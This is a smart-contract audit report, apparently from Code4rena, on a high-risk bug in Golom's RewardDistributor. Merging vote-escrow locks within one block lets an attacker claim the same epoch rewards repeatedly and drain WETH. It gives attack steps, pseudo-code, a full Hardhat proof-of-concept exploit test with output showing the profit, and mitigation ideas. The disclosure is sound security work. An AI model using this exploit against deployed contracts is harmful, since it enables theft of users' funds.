## Tags

- bug
- 3 (High Risk)
- resolved
- sponsor confirmed
- selected-for-report

# [Repeated calls to `multiStakerClaim` in the same block leads to loss of funds](https://github.com/code-423n4/2022-07-golom-findings/issues/139) 

# Lines of code

https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L172-L210
https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L185


# Vulnerability details

## Impact
A malicious user can repeatedly claim the same staker reward for an epoch, provided the transactions all happen in the same block. This can effectively be done using services like [Flashbots bundles](https://docs.flashbots.net/Flashbots-auction/searchers/faq/#can-you-give-a-step-by-step-description-of-how-flashbots-works-for-a-searcher-today) and will result in the draining of the WETH balance of the `RewardDistributor` contract.

The idea is to bypass the require statement [line 185](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L185) which checks if a claim has been already done for the epoch, **for a specific token ID**. By moving the locked tokens in a new lock, a new token ID will be generated and can be used to claim the rewards again, **if the transaction happens in the same block for which the epoch is updated**.

Indeed, when `multiStakerClaim()` is called, the `rewardETH` will be calculated from the amount of tokens locked in `tokenids[tindex]` at the block that triggered the epoch change (variable `epochBeginTime`). If, during this time, an attacker transfers its staked tokens to a new vault using the [`merge`](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L893) function of the VE token, the function will calculate the amount of staked tokens for the newly created tokenID **as the same as the original tokenID reward**.

A example abuse will look like this (pseudo-code adapted from the PoC) :
```javascript
lockID = voteEscrow.create_lock(amount, 1 week); // Create lock #1 before
// IN THE BLOCK OF EPOCH CHANGE
rewardDistributor.multiStakerClaim([lockId], [0]); // Claim epoch 0 rewards for lock #1
voteEscrow.create_lock(1, 1 week); // Create lock #2 (requires 1 Golom token, could be created in advance)
voteEscrow.merge(lockId, lockId + 1); // Transfer lock #1 tokens to lock #2
rewardDistributor.multiStakerClaim([lockId + 1], [0]); // Claim same epoch rewards for lock #2
// repeat ...
```

To abuse this, the attacker needs to follow this steps:
- Have some locked Golom tokens.
- Wait for a `addFee` call that will trigger an epoch change (this can be monitored by looking at the mempool or predicted from block timestamps). Services like Flashbots also [allows for specifying a range of blocks for bundles](https://docs.flashbots.net/Flashbots-auction/searchers/faq/#how-do-i-target-a-timestamp-range-instead-of-a-block-number-when-submitting-a-bundle) for better targeting.
- Send a bundle of transactions to be included with the block containing the epoch changing transaction (see the PoC for an example of transactions).

Note that this needs to succeed only once to allow an attacker to drain all WETH funds so if the bundle isn't included for a particular epoch, given the frequency of epoch changes, the bundle will eventually be included and trigger the exploit.

## Proof of Concept
Hardhat config for disabling auto-mine and control transactions included in blocks:
```json
hardhat: {
    allowUnlimitedContractSize: true,
    gas: 12000000,
    blockGasLimit: 0x1fffffffffffff,
    mining: {
      auto: false,
      interval: 10
    }
},
```
Hardhat test (requires setting up VoteEscrow):
```javascript
it('[#2] Repeated calls to `multiStakerClaim` in the same block leads to loss of funds', async () => {
    async function advance_time(time_s:any){
        let timestamp = await getTimestamp();
        await ethers.provider.send('evm_mine', [timestamp + time_s]);
    }

    async function mine(){
        await ethers.provider.send('evm_mine', []);
    }

    async function send_order(){
        await testErc721.mint(await maker.getAddress());

        let exchangeAmount = ethers.utils.parseEther('1'); // cut for the exchanges
        let prePaymentAmt = ethers.utils.parseEther('0.25'); // royalty cut
        let totalAmt = ethers.utils.parseEther('10');
        let tokenId = await testErc721.current();

        const order = {
            collection: testErc721.address,
            tokenId: tokenId,
            signer: await maker.getAddress(),
            orderType: 0,
            totalAmt: totalAmt,
            exchange: { paymentAmt: exchangeAmount, paymentAddress: await exchange.getAddress() },
            prePayment: { paymentAmt: prePaymentAmt, paymentAddress: await prepay.getAddress() },
            isERC721: true,
            tokenAmt: 1,
            refererrAmt: 0,
            root: '0x0000000000000000000000000000000000000000000000000000000000000000',
            reservedAddress: constants.AddressZero,
            nonce: 0,
            deadline: Date.now() + 100000000,
            r: '',
            s: '',
            v: 0,
        };

        let signature = (await maker._signTypedData(domain, types, order)).substring(2);

        order.r = '0x' + signature.substring(0, 64);
        order.s = '0x' + signature.substring(64, 128);
        order.v = parseInt(signature.substring(128, 130), 16);

        return golomTrader.connect(prepay).fillAsk(
            order, 
            1, 
            constants.AddressZero, 
            {paymentAmt: prePaymentAmt, paymentAddress: await governance.getAddress()}, 
            constants.AddressZero, 
            {value: utils.parseEther('10.25')}
        );
    }

    async function showPendingBlock(){
        console.log('[PENDING]\n', await ethers.provider.send("eth_getBlockByNumber", ["pending", false]));
    }

    // Get some Golom tokens to taker, could come from anywhere
    await golomToken.connect(governance).mintAirdrop(await taker.getAddress());
    // Approve spending from VE
    await golomToken.connect(taker).approve(voteEscrow.address, constants.MaxUint256);

    // Simulate more fees by putting some ETH in contract before epoch 0
    await maker.sendTransaction({to: rewardDistributor.address, value: utils.parseEther('100')});

    // Taker starts with 10_000 ETH, hardhat account
    let takerStartBalance = await ethers.provider.getBalance(taker.address);
    // Send order for first epoch to get some fees in 'epochTotalFee'
    await send_order();
    await mine();
    advance_time(1659211200 + 24*60*60 + 1); // Fast forward to epoch 1
    
    // Setup some users who locks their tokens in VE beforehand
    let lockId = 0;
    for (let i = 0; i < 5; ++i){
        let user = accounts[6+i];
        await golomToken.connect(taker).transfer(await user.getAddress(), utils.parseEther('1'));
        await golomToken.connect(user).approve(voteEscrow.address, constants.MaxUint256);
        await voteEscrow.connect(user).create_lock(utils.parseEther('1'), 7*24*60*60, {gasLimit: 100000000});
        lockId += 1;
    }

    // Create lock for taker with 1 ETH equivalent in Golom tokens (could work with only 1 'Wei' token although it will require lots of transactions)
    await voteEscrow.connect(taker).create_lock(utils.parseEther('1'), 24*60*60*7, {gasLimit: 100000000});
    lockId += 1;
    await send_order(); // Trigger epoch change

    // --- IN THE SAME BLOCK ---
    await rewardDistributor.multiStakerClaim([lockId], [0]); // Claim epoch rewards for lock #1
    await voteEscrow.connect(taker).create_lock(1, 24*60*60*7, {gasLimit: 100000000}); // Create lock #2 (requires 1 Golom token)
    await voteEscrow.connect(taker).merge(lockId, lockId + 1, {gasLimit: 100000000}); // Merge lock #1 tokens to lock #2
    await rewardDistributor.multiStakerClaim([lockId + 1], [0]); // Claim same epoch rewards for lock #2
    // ... Repeat as much as you want ;)
    // --- IN THE SAME BLOCK ---
    await mine();

    console.log('Taker WETH balance:', utils.formatEther(await weth.balanceOf(taker.address)));
    await weth.connect(taker).withdraw(await weth.balanceOf(taker.address)); // Could be the last transaction in the block too
    await mine();

    // Taker balance difference is +++ at the end 
    let takerEndBalance = (await ethers.provider.getBalance(taker.address)).sub(takerStartBalance);
    console.log('Taker ETH balance:', utils.formatEther(await ethers.provider.getBalance(taker.address)), '/ end:', utils.formatEther(takerEndBalance));
});
```
Sample output:
```console
RewardDistributor.sol                                                                                                                                              
    Exploits                                                                                                                                                         
[SOL] 27 0 50000000000000000 // First addFee call for adding fees

[SOL] 38 0 50000000000000000 // Second addFee triggering epoch change
[WETH] Deposit 100100000000000000000 // Epoch 0 WETH deposit
[SOL_EPOCH]
1 599999983058823529411764 16941175992249134 50000000000000000 // epoch, tokenToEmit, stakerReward, previousEpochFee
16941175992249134 401999977298823849898962 197999988818823687263667 38 // rewardStaker[epoch], rewardTrader[epoch], rewardExchange[epoch], epochBeginTime[epoch]

0x70997970c51812dc3a010c7d01b50e0d17dc79c8 balance before: 0 // WETH balance of taker
[CLAIM] 6 38 911822995832895 // First multiStakerClaim, (tokenID, epochBeginTime, balanceOfAtNFT)
[WETH] Sent 16683333333333333333 to 0x70997970c51812dc3a010c7d01b50e0d17dc79c8
0x70997970c51812dc3a010c7d01b50e0d17dc79c8 balance after: 16683333333333333333 // WETH balance of taker

0x70997970c51812dc3a010c7d01b50e0d17dc79c8 balance before: 16683333333333333333 // WETH balance of taker
[CLAIM] 7 38 911822995832895 // Second multiStakerClaim, (tokenID, epochBeginTime, balanceOfAtNFT)
[WETH] Sent 16683333333333333333 to 0x70997970c51812dc3a010c7d01b50e0d17dc79c8
0x70997970c51812dc3a010c7d01b50e0d17dc79c8 balance after: 33366666666666666666 // WETH balance of taker

Taker WETH balance: 33.366666666666666666 // After block is mined
Taker ETH balance: 10033.36524137856006494 / end: 33.365289929424174404 // Profit !!
      √ [#2] Repeated calls to `multiStakerClaim` in the same block leads to loss of funds
```
## Recommended Mitigation Steps
I initially thought about a few possible solutions:
- Checking a lock creation time to prevent claiming from locks created in the same block **but the attacker can just create the blocks beforehand.**
- Tracking the `msg.sender` or `tx.origin` for preventing multiple calls to `multiStakerClaim` in the same block **but the attacker can just send transactions from different addresses.**
- Preventing the merging of locks **but the attacker can just create locks in advance and withdraw/add funds continuously between old/new locks.** 

None really fixes the vulnerability as it comes from the feature of **locks being tradable** meaning it's not practically feasable to know if a lock has already be claimed by an individual **just by looking at the lock ID**.

A possible solution would be to find a way to prevent multiple calls to the same function within a block or better, make a checkpoint of the locks balances for each `epochBeginTime` and uses these values for calculating the rewards (instead of querying the VE contract in the loop).

